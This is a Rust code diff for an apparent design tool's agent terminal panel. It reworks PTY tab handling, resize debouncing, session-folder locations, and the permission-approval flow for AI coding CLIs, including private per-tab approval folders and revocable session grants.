+            for lock_name in [
+                format!("{}.lock", crate::agent_hook_outputs::EVENTS_FILE_NAME),
+                format!("{}.lock", crate::agent_hook_outputs::STATUS_FILE_NAME),
+                format!("{}.lock", crate::agent_usage::CLAUDE_TRANSCRIPT_META_FILENAME),
+            ] {
+                let _ = crate::agent_session_files::remove_session_dir_all(&hook_dir.dir().join(lock_name));
             }
         }
-        let approvals_dir = session
-            .map(|s| crate::agent_permissions::tab_approvals_dir(&s.session_dir, id))
-            .unwrap_or_else(|| std::env::temp_dir().join(format!("designos-approvals-tab-{id}")));
+        // A new tab starts with an empty approvals folder: requests of an earlier run with the same id are not its own.
+        let approvals_dir = session.and_then(|s| crate::agent_approval_channel::tab_approvals_dir(&s.session_dir, id));
+        if let Some(sess) = session {
+            crate::agent_approval_channel::remove_tab_dir(&sess.session_dir, id);
+        }
         configure_pty_env_with_session(&mut cmd, preset, file_path, session);
         if session.is_some() {
-            cmd.env("DESIGNOS_APPROVALS_DIR", approvals_dir.as_os_str());
             cmd.env("DESIGNOS_TAB_ID", id.to_string());
         }
 
@@ -690,15 +910,17 @@ impl TerminalTab {
         let child = pair.slave.spawn_command(cmd).map_err(|e| format!("spawn_command failed: {e}"))?;
         let slave = Arc::new(Mutex::new(Some(pair.slave)));
 
-        let init_parser = vt100::Parser::new(rows, cols, 5000);
+        let init_parser = vt100::Parser::new(rows, cols, TERM_SCROLLBACK_LINES);
         let parser = Arc::new(Mutex::new(init_parser));
         let raw_log = Arc::new(Mutex::new(String::new()));
         let raw_log_drained = Arc::new(std::sync::atomic::AtomicUsize::new(0));
         let agent_status = Arc::new(Mutex::new(AgentTabStatus::Idle));
         let last_output_at = Arc::new(Mutex::new(None));
         let reader_eof = Arc::new(std::sync::atomic::AtomicBool::new(false));
+        let screen_rev = Arc::new(std::sync::atomic::AtomicU64::new(0));
         let pty_waiting_heuristic = Arc::new(std::sync::atomic::AtomicBool::new(false));
         let stop_in_flight = Arc::new(std::sync::atomic::AtomicBool::new(false));
+        let restore_scrollback = Arc::new(std::sync::atomic::AtomicUsize::new(0));
 
         let parser_bg = Arc::clone(&parser);
         let log_bg = Arc::clone(&raw_log);
@@ -706,15 +928,18 @@ impl TerminalTab {
         let status_bg = Arc::clone(&agent_status);
         let output_at_bg = Arc::clone(&last_output_at);
         let eof_bg = Arc::clone(&reader_eof);
+        let screen_rev_bg = Arc::clone(&screen_rev);
         let waiting_heuristic_bg = Arc::clone(&pty_waiting_heuristic);
         let slave_bg = Arc::downgrade(&slave);
         let stop_bg = Arc::clone(&stop_in_flight);
+        let restore_sb_bg = Arc::clone(&restore_scrollback);
 
         let uses_pty_heuristic = preset == AgentCliPreset::Codex;
         std::thread::Builder::new()
             .name(format!("designos-pty-reader-{id}"))
             .spawn(move || {
                 let mut buf = [0u8; 4096];
+                let mut esc3j_state = 0u8;
                 loop {
                     match reader.read(&mut buf) {
                         Ok(0) => break,
@@ -750,12 +975,11 @@ impl TerminalTab {
                                 }
                             }
                             if let Ok(mut p) = parser_bg.lock() {
-                                if clean_chunk.len() == chunk.len() {
-                                    p.process(&buf[..n]);
-                                } else {
-                                    p.process(clean_chunk.as_bytes());
-                                }
+                                let bytes = if clean_chunk.len() == chunk.len() { &buf[..n] } else { clean_chunk.as_bytes() };
+                                process_pty_bytes(&mut p, bytes, &mut esc3j_state, &restore_sb_bg);
                             }
+                            // After the screen has the chunk: a reader that sees the new number reads a screen that has it.
+                            screen_rev_bg.fetch_add(1, std::sync::atomic::Ordering::Release);
                             if let Ok(mut log) = log_bg.lock() {
                                 log.push_str(&clean_chunk);
                                 if log.len() > MAX_RAW_LOG_BYTES {
@@ -815,6 +1039,8 @@ impl TerminalTab {
             last_usage_status: None,
             reader_eof,
             pty_waiting_heuristic,
+            gemini: Default::default(),
+            screen_rev,
             exited_at: None,
             turn_ledger: crate::agent_turn_ledger::AgentTurnLedger::default(),
             unread: false,
@@ -838,6 +1064,9 @@ impl TerminalTab {
             last_scanned_log_len: 0,
             last_user_prompt: None,
             input_line_buffer: String::new(),
+            resize_count: 0,
+            pending_resize: None,
+            restore_scrollback,
         })
     }
 
@@ -858,16 +1087,11 @@ impl TerminalTab {
     /// [`Self::effective_status`] judged at `now`: Codex counts as working while its PTY output is under 600 ms old at `now`.
     pub(crate) fn effective_status_at(&self, now: std::time::Instant) -> AgentTabStatus {
         let explicit_status = self.agent_status.lock().ok().map(|g| g.clone()).unwrap_or_default();
-        let recent_pty_activity = self.spawn_preset == AgentCliPreset::Codex
-            && self.last_output_at.lock().ok().and_then(|g| *g).is_some_and(|ts| now.saturating_duration_since(ts) < std::time::Duration::from_millis(600));
-        match explicit_status {
-            AgentTabStatus::Working(d) => AgentTabStatus::Working(d),
-            AgentTabStatus::WaitingForInput(d) => AgentTabStatus::WaitingForInput(d),
-            // A stopped Codex tab keeps showing `Stopped` while the CLI is still repainting its prompt (`#684`).
-            AgentTabStatus::Stopped => AgentTabStatus::Stopped,
-            other if recent_pty_activity => AgentTabStatus::Working(None),
-            other => other,
+        if self.spawn_preset.uses_pty_heuristic() {
+            let last_output_at = self.last_output_at.lock().ok().and_then(|g| *g);
+            return resolve_pty_heuristic_status(explicit_status, last_output_at, now);
         }
+        explicit_status
     }
 
     /// True for a tool, notification or failure hook event that was already in flight when the user stopped this tab. Such a
@@ -949,16 +1173,45 @@ impl TerminalTab {
 
     /// Resizes both the underlying OS PTY and the `vt100::Parser` when the viewport changes.
     pub fn resize(&mut self, rows: u16, cols: u16) {
-        let rows = rows.max(4);
-        let cols = cols.max(16);
+        let rows = rows.max(TERM_MIN_ROWS);
+        let cols = cols.max(TERM_MIN_COLS);
+        self.pending_resize = None;
         if self.rows == rows && self.cols == cols {
             return;
         }
         self.rows = rows;
         self.cols = cols;
+        self.resize_count += 1;
         let _ = self.master.resize(PtySize { rows, cols, pixel_width: 0, pixel_height: 0 });
         if let Ok(mut p) = self.parser.lock() {
             p.set_size(rows, cols);
+        }
+        self.screen_rev.fetch_add(1, std::sync::atomic::Ordering::Release);
+    }
+
+    /// Schedules a debounced PTY and parser resize (`#1171` R1), applying it only once `(rows, cols)` has
+    /// stayed unchanged for [`RESIZE_DEBOUNCE_SECS`] (`120 ms`) of frame time. Returns `true` while waiting.
+    pub fn request_resize(&mut self, rows: u16, cols: u16, now_s: f64) -> bool {
+        let rows = rows.max(TERM_MIN_ROWS);
+        let cols = cols.max(TERM_MIN_COLS);
+        if self.rows == rows && self.cols == cols {
+            self.pending_resize = None;
+            return false;
+        }
+        match self.pending_resize {
+            Some(((pr, pc), since)) if pr == rows && pc == cols => {
+                if now_s - since >= RESIZE_DEBOUNCE_SECS {
+                    self.pending_resize = None;
+                    self.resize(rows, cols);
+                    false
+                } else {
+                    true
+                }
+            }
+            _ => {
+                self.pending_resize = Some(((rows, cols), now_s));
+                true
+            }
         }
     }
 
@@ -997,10 +1250,17 @@ impl TerminalTab {
         self.preset == AgentCliPreset::Shell && self.spawned_command.is_some() && !self.is_shell_process()
     }
 
-    /// True when this tab is Claude Code, which reads attached skills from its `UserPromptSubmit` hook. Every other CLI, a custom
-    /// command included, never reads that hook and gets the skills in the pasted prompt (`#573`).
-    pub fn reads_skills_from_hook(&self) -> bool {
-        self.spawn_preset == AgentCliPreset::Claude && !self.is_custom_cli()
+    /// Why the mode this tab runs in cannot take prompts for its CLI (Ask when risky with no approval hook), or `None`.
+    pub fn mode_refusal(&self) -> Option<&'static str> {
+        crate::agent_permissions::start_refusal_in_mode(self.spawn_preset, self.is_custom_cli(), self.permission_mode)
+    }
+
+    /// True when this tab is Claude Code and its session has a hook folder, so Claude reads attached skills from its `UserPromptSubmit`
+    /// hook. Every other CLI, a custom command included, never reads that hook and gets the skills in the pasted prompt (`#573`), and so
+    /// does a Claude tab whose session has no hook folder: none of its hooks is installed (`hooks_without_a_folder`), so a reply file
+    /// written for the hook would never be read.
+    pub fn reads_skills_from_hook(&self, session_dir: &Path) -> bool {
+        self.spawn_preset == AgentCliPreset::Claude && !self.is_custom_cli() && crate::agent_hook_outputs::HookPaths::locate(session_dir).is_made()
     }
 
     /// The runtime recorded in `run.json` for skills sent to this tab: the CLI's binary name, `custom` for an "Other CLI…" command
@@ -1144,8 +1404,6 @@ pub struct TerminalState {
     pub active_tab: usize,
     /// Unattached composer state held while `tabs` is empty; moved into the first spawned tab (`#689` §4).
     pub unattached_composer: crate::agent_composer::ComposerState,
-    /// Why the last sample-prompt click could not start an agent session; painted under the prompts until the next click.
-    pub sample_prompt_error: Option<String>,
     /// Bridge actions a send polled for early (to learn whether the tab failed to start); the next
     /// [`Self::poll_live_agent_bridge`] returns them first so no spec or live-log apply is lost.
     pub deferred_bridge_actions: Vec<TerminalAction>,
@@ -1167,10 +1425,14 @@ pub struct TerminalState {
     pub chat_mode: bool,
     /// Whether the top `+` runtime selector dropdown menu (`claude`, `codex`, `grok`, `antigravity`, `shell`) is open (`DIR-29`).
     pub runtime_dropdown_open: bool,
+    /// Composer add menu (`Add selection`, `Attach PRD`, `Skills…`).
+    pub attach_menu_open: bool,
+    /// Composer permission-mode menu.
+    pub mode_menu_open: bool,
+    /// Canvas selection copied for the composer chip. Updated only when it changes.
+    pub composer_selection: crate::agent_selection_chip::SelectionSummary,
     /// Fix clicked on a tab's "failed to start" panel, applied by the surface that knows the open file.
     pub pending_start_fix: Option<FixAction>,
-    /// Context that selects which starter sample prompts appear in the empty state (`#688`).
-    pub prompt_context: crate::agent_sample_prompts::PromptContext,
     /// Active CLI runtime (`Claude`, `Codex`, `Antigravity`, `Grok`, `Shell`).
     pub active_runtime: AgentCliPreset,
     /// Whether the Orca floating `Cmd+F` terminal search bar is open.
@@ -1191,6 +1453,10 @@ pub struct TerminalState {
     /// The shell sets it before the panels draw: those overlays draw after the Agents panel in the same frame, so the
     /// terminal would already have sent the keys to the agent when they looked for them (`#923`).
     pub overlay_owns_keyboard: bool,
+    /// True while a dialog, palette or menu that is open by a flag owns the keys, a marked popup not counted ([`modal_owns_keyboard`]).
+    pub modal_owns_keyboard: bool,
+    /// Set by `+` (new chat): the composer takes the caret in the pass it is drawn, after its field exists.
+    pub pending_composer_focus: bool,
     /// Deferred undo depth to fold once a user edit in progress finishes (`#684 §3.4`).
     pub pending_stop_fold_depth: Option<usize>,
     /// Deferred stop close metadata (`depth`, `pre_close_patch_count`, `run_id`, `agent`) (`#684 §3.4`, `§3.5`).
@@ -1208,7 +1474,7 @@ pub struct TerminalState {
     pub path_override: Option<std::ffi::OsString>,
     /// How this terminal's session directory is keyed (`LibraryFile` vs `Fallback`).
     pub key: crate::agent_sessions::SessionKey,
-    /// Active Studio library root (`#652` / `#653`), retained even when the session falls back to `/tmp/designos-sessions/`.
+    /// Active Studio library root (`#652` / `#653`), retained even when the session falls back to the ephemeral folder under `<data dir>/designos/sessions/`.
     pub library_root: Option<PathBuf>,
     /// Persistent `sessions.json` registry for this session folder (`#653`).
     pub session_registry: crate::agent_sessions::SessionRegistry,
@@ -1242,7 +1508,7 @@ pub struct TerminalState {
     pub rename_session_focus_pending: bool,
     /// Prompt held by `dispatch_figma_ai_prompt` when no live tab and no resumable session exist (`#651` §3 rule 10).
     pub pending_prompt: Option<(String, String)>,
-    /// Hook-written turn boundary marks reader (`<session_dir>/turn-marks.jsonl`, `#677`).
+    /// Hook-written turn boundary marks reader (`turn-marks.jsonl` of the hook folder, `agent_hook_outputs`, `#677`).
     pub turn_marks: crate::agent_turn_marks::TurnMarkLog,
     /// Fallback turn ledger used when `tabs` is empty (`#677`).
     pub turn_ledger: crate::agent_turn_ledger::AgentTurnLedger,
@@ -1260,8 +1526,11 @@ pub struct TerminalState {
     pub status_changes: Vec<(usize, AgentTabStatus)>,
     /// Permission mode for newly spawned agent tabs (`Skip` vs `Ask`, `#656`).
     pub permission_mode: crate::agent_permissions::AgentPermissionMode,
-    /// Queued in-panel approval requests read from `<session_dir>/approvals/` (`#656`).
+    /// Queued in-panel approval requests read from the active tab's private approvals folder (`#656`).
     pub pending_approvals: Vec<crate::agent_permissions::ApprovalRequest>,
+    /// Modify grants for this window. Another window has its own store. Never written into the session folder.
+    pub session_grants: crate::agent_permissions::GrantStore,
+    pub auto_allow_log: crate::agent_permissions::AutoAllowLog,
     /// Latch ensuring at most one OS notification per waiting episode (`#656`).
     pub notification_latch: crate::agent_permissions::NotificationLatch,
     /// Pluggable OS notification sender (`#656`).
@@ -1290,24 +1559,46 @@ pub struct TerminalState {
     session_closed: bool,
     /// Pauses the retry of a snapshot write that failed (`#690` edge case 5).
     write_backoff: crate::agent_session_files::WriteBackoff,
+    /// What the last provisioning has to tell the user about the start, as sentences for the Spawned line (`None` when nothing): what it
+    /// moved out of the way of Grok or Antigravity, and the `designos` server it left out of an untitled design that has no workspace.
+    set_aside_note: Option<String>,
+    /// The reason the last start was refused because Ask when risky cannot run that CLI, for the prompt that asked for it to read
+    /// and keep its text; cleared by the next start that goes ahead.
+    pub(crate) last_start_refusal: Option<&'static str>,
+    /// Last computed `(rows, cols)` of the VT100 viewport (`#1171`).
+    pub viewport_size: (u16, u16),
+}
+
+/// Removes a scratch session folder but keeps `close-result.json`: an agent's close of this very tab writes its answer there, and
+/// the tab's shutdown (which removes the folder) runs right after. Without the answer the agent waits out its timeout for a close that
+/// happened. The stray folder holds only that file and goes with the next sweep of folders whose process is gone.
+fn remove_scratch_dir_keeping_the_close_answer(dir: &Path) {
+    let result = dir.join(designos_doc::live_patch::CloseIntent::RESULT_FILE);
+    let answer = crate::agent_session_files::read_session_file(&result).ok();
+    let _ = std::fs::remove_dir_all(dir);
+    if let Some(bytes) = answer {
+        if crate::agent_session_files::ensure_session_dir(dir).is_ok() {
+            let _ = atomic_write_session_file(&result, &bytes);
+        }
+    }
 }
 
 impl Default for TerminalState {
     fn default() -> Self {
+        // A test state has a tab id and a live-spec path of its own, so tests never see each other's session folder or spec.
         #[cfg(test)]
-        let tab_id = {
+        {
             use std::sync::atomic::{AtomicU64, Ordering};
             static NEXT_TEST_TAB_ID: AtomicU64 = AtomicU64::new(100_000);
-            NEXT_TEST_TAB_ID.fetch_add(1, Ordering::Relaxed)
-        };
-        #[cfg(not(test))]
-        let tab_id = 1;
-        let mut st = Self::for_tab(tab_id);
-        if cfg!(test) {
+            let mut st = Self::for_tab(NEXT_TEST_TAB_ID.fetch_add(1, Ordering::Relaxed));
             st.live_spec_path = st.session_dir.join("live-agent-out-test-isolated.spec.json");
-            st.last_watched_mtime = std::fs::metadata(&st.live_spec_path).and_then(|m| m.modified()).ok();
+            st.last_watched_mtime = spec_mtime(&st.live_spec_path);
+            st
         }
-        st
+        #[cfg(not(test))]
+        {
+            Self::for_tab(1)
+        }
     }
 }
 
@@ -1318,7 +1609,7 @@ impl Drop for TerminalState {
 }
 
 /// Agent session id of document tab `tab_id` in the Studio window `instance_id`
-/// (`/tmp/designos-sessions/<instance_id>-tab-<tab_id>`). A tab's session id is formed only here,
+/// (`<data dir>/designos/sessions/<instance_id>-tab-<tab_id>`). A tab's session id is formed only here,
 /// so the id a terminal is created with and the id the tab bar binds it to have one shape.
 pub fn tab_session_id(instance_id: &str, tab_id: u64) -> String {
     format!("{instance_id}-tab-{tab_id}")
@@ -1362,7 +1653,7 @@ fn write_bootstrap_artifacts(session_dir: &Path, boot: &designos_export::agent_c
         }
     });
     if let Ok(reply_bytes) = serde_json::to_vec_pretty(&boot_reply) {
-        let _ = atomic_write_session_file(&session_dir.join("bootstrap-context-reply.json"), &reply_bytes);
+        let _ = atomic_write_session_file(&crate::agent_hook_outputs::HookPaths::locate(session_dir).bootstrap_reply(), &reply_bytes);
     }
 }
 
@@ -1374,7 +1665,7 @@ fn write_compact_bootstrap_fallback(session_dir: &Path, compact: &designos_expor
         }
     });
     if let Ok(reply_bytes) = serde_json::to_vec_pretty(&compact_reply) {
-        let _ = atomic_write_session_file(&session_dir.join("bootstrap-compact-reply.json"), &reply_bytes);
+        let _ = atomic_write_session_file(&crate::agent_hook_outputs::HookPaths::locate(session_dir).compact_reply(), &reply_bytes);
     }
     let md_path = session_dir.join("bootstrap.md");
     if !md_path.exists() {
@@ -1399,10 +1690,16 @@ fn page_context_json(session_id: &str, doc_name: &str, file_path: Option<&Path>,
     })
 }
 
+/// The modification time of the spec file `live-spec.json` of a session folder, taken from the file as it is opened (never from the
+/// target of a link). `None` for a missing file, a link and a FIFO.
+fn spec_mtime(path: &Path) -> Option<std::time::SystemTime> {
+    crate::agent_session_files::session_file_metadata(path).ok()?.modified().ok()
+}
+
 /// Tools the session's `mcp-config.json` enables: `None` when no custom list exists (every tool).
 /// `designos-mcp` reads the same file at start, so this is the set its `tools/list` exposes.
 fn session_enabled_tools(mcp_config_path: &Path) -> Option<std::collections::BTreeSet<String>> {
-    let raw = std::fs::read_to_string(mcp_config_path).ok();
+    let raw = crate::agent_session_files::read_session_text(mcp_config_path);
     designos_mcp::rules::reconcile_designos_block(raw.as_deref()).map(|custom| custom.enabled)
 }
 
@@ -1410,22 +1707,33 @@ fn session_enabled_tools(mcp_config_path: &Path) -> Option<std::collections::BTr
 /// first-turn bootstrap block (section 7, full and compact) all take their rules from here, so they cannot
 /// disagree and a disabled tool is never listed (`E15-16 §8.6`).
 fn session_rules_pack(enabled_tools: Option<&std::collections::BTreeSet<String>>) -> std::borrow::Cow<'static, str> {
-    match enabled_tools {
-        Some(set) => designos_mcp::rules::generate_rules_pack(Some(set))
-            .map(std::borrow::Cow::Owned)
-            .unwrap_or(std::borrow::Cow::Borrowed(designos_mcp::rules::GENERATED_RULES_MD)),
-        None => std::borrow::Cow::Borrowed(designos_mcp::rules::GENERATED_RULES_MD),
+    fn fallback_rules_pack() -> std::borrow::Cow<'static, str> {
+        if designos_mcp::rules::GENERATED_RULES_MD.contains('\r') {
+            std::borrow::Cow::Owned(designos_mcp::rules::GENERATED_RULES_MD.replace("\r\n", "\n").replace('\r', "\n"))
+        } else {
+            std::borrow::Cow::Borrowed(designos_mcp::rules::GENERATED_RULES_MD)
+        }
     }
+    match enabled_tools {
+        Some(set) => designos_mcp::rules::generate_rules_pack(Some(set)).map(std::borrow::Cow::Owned).unwrap_or_else(|_| fallback_rules_pack()),
+        None => fallback_rules_pack(),
+    }
+}
+
+// How often this thread read the saved permission mode from disk (tests count the reads of one spawn or resume).
+#[cfg(test)]
+thread_local! {
+    static MODE_READS: std::cell::Cell<usize> = const { std::cell::Cell::new(0) };
 }
 
 impl TerminalState {
     /// Creates an isolated `TerminalState` bound to document tab `tab_id` of this process
-    /// (`/tmp/designos-sessions/p<pid>-tab-{tab_id}`). A window's terminal is bound to its own
+    /// (`<data dir>/designos/sessions/p<pid>-tab-{tab_id}`). A window's terminal is bound to its own
     /// instance (`TabsState::session_id_for_tab`) before any shell starts in it.
     pub fn for_tab(tab_id: u64) -> Self {
         let session_id = tab_session_id(&format!("p{}", std::process::id()), tab_id);
         let active_run_id = format!("{session_id}-1-1");
-        let session_dir = std::env::temp_dir().join("designos-sessions").join(&session_id);
+        let session_dir = crate::agent_session_files::ephemeral_session_dir(&session_id);
         let live_spec_path = session_dir.join("live-spec.json");
         let live_doc_sync_path = session_dir.join("doc-sync.designos");
         let live_canvas_path = session_dir.join("canvas.designos");
@@ -1433,10 +1741,12 @@ impl TerminalState {
         let selection_spec_path = session_dir.join("selection.spec.json");
         let bootstrap_md_path = session_dir.join("bootstrap.md");
         let bootstrap_json_path = session_dir.join("bootstrap.json");
-        let initial_spec_mtime = std::fs::metadata(&live_spec_path).and_then(|m| m.modified()).ok();
+        let initial_spec_mtime = spec_mtime(&live_spec_path);
         let live_patch = crate::live_patch_log::LivePatchLog::bind(session_dir.join("doc-patch.jsonl"));
-        let turn_marks = crate::agent_turn_marks::TurnMarkLog::bind(session_dir.join("turn-marks.jsonl"));
-        let event_stream = crate::agent_turn_status::AgentEventStream::bind(session_dir.join("agent-events.jsonl"));
+        let hook_paths = crate::agent_hook_outputs::HookPaths::locate(&session_dir);
+        let turn_marks = crate::agent_turn_marks::TurnMarkLog::bind(hook_paths.turn_marks());
+        let event_stream = crate::agent_turn_status::AgentEventStream::bind(hook_paths.events());
+        let auto_allow_log = crate::agent_permissions::AutoAllowLog::bind(&session_dir);
         #[cfg(test)]
         let notifier = crate::agent_notify::AgentNotifier::with_sink(Arc::new(crate::agent_notify::StubNotificationSink::new()));
         #[cfg(not(test))]
@@ -1470,7 +1780,6 @@ impl TerminalState {
             tabs: Vec::new(),
             active_tab: 0,
             unattached_composer: crate::agent_composer::ComposerState::default(),
-            sample_prompt_error: None,
             deferred_bridge_actions: Vec::new(),
             status_msg: None,
             next_tab_id: 1,
@@ -1483,8 +1792,10 @@ impl TerminalState {
             side_panel_pty_open: true,
             chat_mode: false,
             runtime_dropdown_open: false,
+            attach_menu_open: false,
+            mode_menu_open: false,
+            composer_selection: crate::agent_selection_chip::SelectionSummary::default(),
             pending_start_fix: None,
-            prompt_context: crate::agent_sample_prompts::PromptContext::NoSelection,
             active_runtime: AgentCliPreset::Shell,
             search_open: false,
             search_query: String::new(),
@@ -1493,6 +1804,8 @@ impl TerminalState {
             composer_focused_last_frame: false,
             composer_focused_now: false,
             overlay_owns_keyboard: false,
+            modal_owns_keyboard: false,
+            pending_composer_focus: false,
             pending_stop_fold_depth: None,
             pending_stop_close: None,
             current_undo_depth: 0,
@@ -1526,6 +1839,8 @@ impl TerminalState {
             status_changes: Vec::new(),
             permission_mode: crate::agent_permissions::AgentPermissionMode::default(),
             pending_approvals: Vec::new(),
+            session_grants: crate::agent_permissions::GrantStore::default(),
+            auto_allow_log,
             notification_latch: crate::agent_permissions::NotificationLatch::default(),
             approval_notifier,
             last_agent_status_done: false,
@@ -1538,6 +1853,9 @@ impl TerminalState {
             snapshot_worker: crate::agent_session_files::SnapshotWorker::new(),
             session_closed: false,
             write_backoff: crate::agent_session_files::WriteBackoff::default(),
+            set_aside_note: None,
+            last_start_refusal: None,
+            viewport_size: (28, 100),
         }
     }
 
@@ -1549,42 +1867,75 @@ impl TerminalState {
         self.approval_notifier = notifier;
     }
 
-    /// True when the active tab has a pending approval request or is waiting for approval (`#656`).
+    /// True when any tab has a pending approval request or is waiting for approval (`#656`, `#1195`).
     pub fn needs_approval(&self) -> bool {
         if !self.pending_approvals.is_empty() {
             return true;
         }
-        self.active_tab().is_some_and(|t| t.needs_approval())
+        self.tabs.iter().any(|t| t.needs_approval())
     }
 
-    fn withdraw_tab_approvals(session_dir: &Path, tab: &mut TerminalTab) {
-        crate::agent_permissions::withdraw_pending_requests_in_dir(&tab.approvals_dir);
-        for req in tab.pending_approvals.drain(..) {
-            let root_req = crate::agent_permissions::approvals_dir(session_dir).join(format!("{}.request.json", req.id));
-            if root_req.exists() {
-                let _ = crate::agent_permissions::write_approval_answer(session_dir, &req.id, crate::agent_permissions::ApprovalDecision::Withdrawn);
+    /// Resolves the approval banner target across all tabs (`#1195`).
+    ///
+    /// Returns `(target_tab_id, preset, requests, is_active_tab, total_pending)` for the oldest waiting tab
+    /// (lowest tab slice order, i.e. spawn order). When multiple tabs are waiting, `total_pending` sums the
+    /// pending approvals across all waiting tabs (at least 1 per waiting tab), and the banner targets the oldest
+    /// waiting tab first so **Open tab** switches to that tab id (`AC-2`).
+    fn approval_banner_target(&self) -> Option<(usize, AgentCliPreset, Vec<crate::agent_permissions::ApprovalRequest>, bool, usize)> {
+        let active_idx = self.active_tab.min(self.tabs.len().saturating_sub(1));
+        let mut waiting: Vec<(usize, &TerminalTab)> = Vec::new();
+        for (idx, tab) in self.tabs.iter().enumerate() {
+            let is_active = idx == active_idx;
+            if tab.needs_approval() || (is_active && !self.pending_approvals.is_empty()) {
+                waiting.push((idx, tab));
             }
         }
+        if let Some(&(first_idx, first_tab)) = waiting.first() {
+            let is_active_tab = first_idx == active_idx;
+            let total_pending: usize =
+                waiting
+                    .iter()
+                    .map(|&(idx, tab)| {
+                        if idx == active_idx && !self.pending_approvals.is_empty() {
+                            self.pending_approvals.len()
+                        } else {
+                            tab.pending_approvals.len().max(1)
+                        }
+                    })
+                    .sum();
+            let reqs = if is_active_tab && !self.pending_approvals.is_empty() { self.pending_approvals.clone() } else { first_tab.pending_approvals.clone() };
+            return Some((first_tab.id, first_tab.preset, reqs, is_active_tab, total_pending));
+        }
+        if !self.pending_approvals.is_empty() {
+            let preset = self.active_tab().map(|t| t.preset).unwrap_or(self.active_runtime);
+            let total = self.pending_approvals.len();
+            return Some((0, preset, self.pending_approvals.clone(), true, total));
+        }
+        None
+    }
+
+    fn withdraw_tab_approvals(tab: &mut TerminalTab) {
+        if let Some(dir) = &tab.approvals_dir {
+            crate::agent_permissions::withdraw_pending_requests_in_dir(dir);
+        }
+        tab.pending_approvals.clear();
     }
 
     fn sync_active_tab_approvals(&mut self) {
         self.pending_approvals = self.active_tab().map(|t| t.pending_approvals.clone()).unwrap_or_default();
     }
 
-    /// Writes `decision` (`Allow` or `Deny`) for `request_id` into the active tab's approvals folder
-    /// (and `<session_dir>/approvals/<id>.answer` if present) and removes the answered entry (`#656`).
+    /// Writes `decision` (`Allow` or `Deny`) for `request_id` into the active tab's private approvals folder, when the
+    /// request is still pending there, and removes the answered entry (`#656`). A folder the agent can write is never
+    /// read or written.
     pub fn answer_pending_approval(&mut self, request_id: &str, decision: crate::agent_permissions::ApprovalDecision) {
-        let mut wrote_tab = false;
         if let Some(tab) = self.active_tab_mut() {
-            if tab.approvals_dir.join(format!("{request_id}.request.json")).exists() {
-                let _ = crate::agent_permissions::write_approval_answer_in_dir(&tab.approvals_dir, request_id, decision);
-                wrote_tab = true;
+            if let Some(dir) = tab.approvals_dir.as_ref().filter(|dir| dir.join(format!("{request_id}.request.json")).exists()) {
+                if let Err(e) = crate::agent_permissions::write_approval_answer_in_dir(dir, request_id, decision) {
+                    eprintln!("design:os studio: could not write the approval answer for request {request_id}: {e}");
+                }
             }
             tab.pending_approvals.retain(|r| r.id != request_id);
-        }
-        let root_req = crate::agent_permissions::approvals_dir(&self.session_dir).join(format!("{request_id}.request.json"));
-        if !wrote_tab || root_req.exists() {
-            let _ = crate::agent_permissions::write_approval_answer(&self.session_dir, request_id, decision);
         }
         self.pending_approvals.retain(|r| r.id != request_id);
         if self.pending_approvals.is_empty() {
@@ -1599,33 +1950,92 @@ impl TerminalState {
         }
     }
 
-    /// Handles a click on the in-panel approval card (`Approve`, `Deny`, or `Open tab`).
+    /// Handles a click on the in-panel approval card (`Approve`, `Allow this session`, `Deny`, `Show prompt`, or `Open tab`).
     pub fn handle_approval_card_action(&mut self, action: crate::agent_approval_card::CardAction) {
         match action {
             crate::agent_approval_card::CardAction::Approve(id) => {
                 self.answer_pending_approval(&id, crate::agent_permissions::ApprovalDecision::Allow);
             }
+            crate::agent_approval_card::CardAction::AllowSession(id) => {
+                self.remember_modify_grant(&id);
+                self.answer_pending_scoped(&id, crate::agent_permissions::AnswerScope::Session);
+            }
             crate::agent_approval_card::CardAction::Deny(id) => {
                 self.answer_pending_approval(&id, crate::agent_permissions::ApprovalDecision::Deny);
             }
-            crate::agent_approval_card::CardAction::OpenTab => {
+            crate::agent_approval_card::CardAction::ShowPrompt => {
+                self.picker_open = false;
                 self.side_panel_pty_open = true;
                 self.chat_mode = false;
+                self.chrome_focused = false;
+                self.viewport_focused = true;
+            }
+            crate::agent_approval_card::CardAction::OpenTab(tab_id) => {
+                if tab_id != 0 {
+                    let _ = self.focus_tab_by_id(tab_id);
+                }
+                self.picker_open = false;
+                self.side_panel_pty_open = true;
+                self.chat_mode = false;
+                self.chrome_focused = false;
                 self.viewport_focused = true;
             }
         }
     }
 
-    /// Populates the approval card state for the `--panel agents-approval-*` screenshot fixtures (`#656`).
-    pub fn open_approval_fixture(&mut self, preset_slug: &str, file_path: Option<&Path>) {
-        self.permission_mode = crate::agent_permissions::AgentPermissionMode::Ask;
-        self.ensure_default_tab(file_path);
-        if let Some(tab) = self.active_tab_mut() {
-            tab.permission_mode = crate::agent_permissions::AgentPermissionMode::Ask;
+    fn remember_modify_grant(&mut self, request_id: &str) {
+        let Some(req) = self.pending_approvals.iter().find(|req| req.id == request_id).cloned() else {
+            return;
+        };
+        let mode = self.active_tab().map(|tab| tab.permission_mode).unwrap_or(self.permission_mode);
+        if !crate::agent_permissions::offer_session_grant(mode, &req) {
+            return;
         }
         let now = crate::agent_sessions::unix_timestamp_secs();
-        let approvals_dir = crate::agent_permissions::approvals_dir(&self.session_dir);
-        let _ = std::fs::create_dir_all(&approvals_dir);
+        let _ = self.session_grants.insert(&self.session_id, &req.tool_name, &req.target, now);
+    }
+
+    fn answer_pending_scoped(&mut self, request_id: &str, scope: crate::agent_permissions::AnswerScope) {
+        if let Some(tab) = self.active_tab_mut() {
+            if let Some(dir) = tab.approvals_dir.as_ref().filter(|dir| dir.join(format!("{request_id}.request.json")).exists()) {
+                if let Err(e) =
+                    crate::agent_permissions::write_scoped_approval_answer_in_dir(dir, request_id, crate::agent_permissions::ApprovalDecision::Allow, scope)
+                {
+                    eprintln!("design:os studio: could not write the approval answer for request {request_id}: {e}");
+                }
+            }
+            tab.pending_approvals.retain(|req| req.id != request_id);
+        }
+        self.pending_approvals.retain(|req| req.id != request_id);
+        if self.pending_approvals.is_empty() {
+            if let Some(tab) = self.active_tab() {
+                if let Ok(mut st) = tab.agent_status.lock() {
+                    if matches!(*st, AgentTabStatus::WaitingForInput(_)) {
+                        *st = AgentTabStatus::Idle;
+                    }
+                }
+            }
+            self.notification_latch.reset();
+        }
+    }
+
+    pub fn revoke_session_grant(&mut self, tool_name: &str, target: &str) -> bool {
+        self.session_grants.revoke(&self.session_id, tool_name, target)
+    }
+
+    /// Populates the approval card state for the `--panel agents-approval-*` screenshot fixtures (`#656`, `#1195`).
